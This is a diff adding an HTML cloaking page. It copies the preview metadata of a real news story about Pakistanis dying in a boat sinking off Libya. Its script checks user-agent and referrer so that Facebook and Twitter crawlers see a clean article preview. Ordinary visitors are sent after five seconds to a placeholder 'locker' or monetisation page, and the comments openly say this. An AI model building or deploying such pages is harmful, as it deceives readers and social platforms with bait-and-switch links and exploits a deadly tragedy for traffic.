@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="robots" content="noindex">
+  <meta property="og:title" content="Four Pakistanis among 11 dead as boat sinks off Libya">
+  <meta property="og:description" content="Tragic incident reported off Libyan coast involving Pakistani nationals.">
+  <meta property="og:image" content="https://i.tribune.com.pk/media/images/2420773-image-1685440374/2420773-image-1685440374.jpg">
+  <meta property="og:url" content="https://tribune.com.pk/story/2539955/four-pakistanis-among-11-dead-as-boat-sinks-off-libya">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Breaking News</title>
+
+  <script>
+    // User-agent detection
+    const ua = navigator.userAgent.toLowerCase();
+    const isBot = ua.includes('facebookexternalhit') || ua.includes('facebot') || ua.includes('twitterbot');
+    
+    // Referrer check - more bot detection
+    const referrer = document.referrer.toLowerCase();
+    const isFacebookBot = referrer.includes('facebook.com') || isBot;
+
+    if (isFacebookBot) {
+      // If bot, show the fake news page
+      console.log("Facebook Bot Detected");
+      // Do nothing, let bot crawl the meta tags
+    } else {
+      // For real users, set a slight delay before redirection
+      setTimeout(() => {
+        // Redirect to the content locker or monetization page after a short delay
+        window.location.href = "https://yourdomain.com/locker-page";
+      }, 5000);  // 5 seconds delay for real users
+    }
+  </script>
+</head>
+<body>
+  <!-- Bot will see this clean page -->
+  <h1>Breaking News</h1>
+  <p>Tragic incident reported off the Libyan coast involving Pakistani nationals. Read more about it here.</p>
+  <img src="https://i.tribune.com.pk/media/images/2420773-image-1685440374/2420773-image-1685440374.jpg" alt="Boat sinking incident">
+  <p><a href="https://tribune.com.pk/story/2539955/four-pakistanis-among-11-dead-as-boat-sinks-off-libya">Click to read the full article</a></p>
+  <!-- Optionally, show loading spinner or text to simulate real content for the user -->
+  <p>Loading news... Please wait</p>
+</body>
+</html>
